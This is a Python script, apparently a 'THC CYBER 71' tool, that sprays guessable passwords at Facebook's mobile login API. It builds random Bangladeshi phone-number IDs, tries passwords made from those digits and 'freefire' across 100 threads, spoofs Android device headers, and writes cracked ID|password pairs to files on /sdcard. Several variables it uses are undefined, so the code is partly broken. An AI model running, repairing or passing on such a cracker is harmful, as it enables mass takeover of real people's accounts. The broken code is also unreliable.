#######+MAKED BY THC+#####
#---------MAIN-MODIULS-------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#---------MISSING-MODIUL---------#
#-------COLOR-CODE------#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
K = '\x1b[1;93m' 
U = '\x1b[1;95m' 
V = '\x1b[1;96m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
princp = []
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Nokia XR20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for ua in range(50000):
    a='Mozilla/5.0 (iPhone'
    b='CPU iPhone OS'
    c=random.choice(['13_4_1','14_8_1', '15_3_1', '15_6_1', '13_3_1', '14_7_1', '16_2', '14_2', '15_6', '15_0', '15_5', '12_4_1','16_0',]) 
    e='like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
    f=random.randrange(73,100)
    g='0'
    h=random.randrange(4200,4900)
    i=random.randrange(40,150)
    j='Mobile/15E148 Safari/604.1'
    uaku2=f'{a}; {b} {c} {e}{f}.{g}.{h}.{i} {j}'
    ugen.append(uaku2)
for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['4.1','5','5.1','10','7','8','9',])
       c='itel S11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
       d= random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['9','10','11','12','13','14','15',])
       c='Nokia C22 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
       d= random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
#---------LOGO-MENU-------#
logo=("""
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\x1b[1;90m┃  \033[1;91md888888b db    db d8888b.  .d8b.   d888b   \x1b[1;90m ┃
\x1b[1;90m┃  \033[1;32m`~~88~~' 88    88 88  `8D d8' `8b 88' Y8   \x1b[1;90m ┃
\x1b[1;90m┃  \033[1;92m   88    88    88 88oobY' 88ooo88 88  \x1b[1;90m      ┃
\x1b[1;90m┃  \033[1;33m   88    88    88 88`8b   88~~~88 88  ooo  \x1b[1;90m ┃
\x1b[1;90m┃  \033[1;93m   88    88b  d88 88 `88. 88   88 88. ~8~   \x1b[1;90m┃
\x1b[1;90m┃  \033[1;36m   YP    ~Y8888P' 88   YD YP   YP  Y888P   \x1b[1;90m ┃
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: THC CYBER 71
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTHC-CYBER-71
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
\033[1;96m═════════════════════════════════════════════
""")
#------MAIN-MENU----#

def turagrndm():
    user=[]
    os.system('xdg-open https://facebook.com/groups/mithuahmed1212/')
    os.system('clear')
    print(logo)
    print('[+] SIM CODE BD=> 016 ~ 017 ~ 018 ~ 019')
    tithie = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    tithiex = ''.join(random.choice(string.digits) for _ in range(2))
    tithi = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('xdg-open https://github.com/THC-CYBER-71')
    print(' [+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as TURAG:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : \033[1;35m'+tithie)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] CRACKING :  \033[1;91m[RANDOM-NUM] ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] METHOD :  \033[1;34mM-1 ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY THC ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : \033[1;91m'+tl)
        print(50*"=")
        for guru in user:
            uid = tithie+tithiex+tithi+guru
            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire']
            TURAG.submit(rcrack1,uid,pwx,tl)
    print(50*"=")
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(50*"=")
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/ACTIVE.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/DEAD.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");o()
def rcrack1(uid,pwx,tl):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [SPY1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source":"device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                                        "method":"auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [THC-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/THC-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [THC-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/THC-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/THC-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
		
turagrndm()
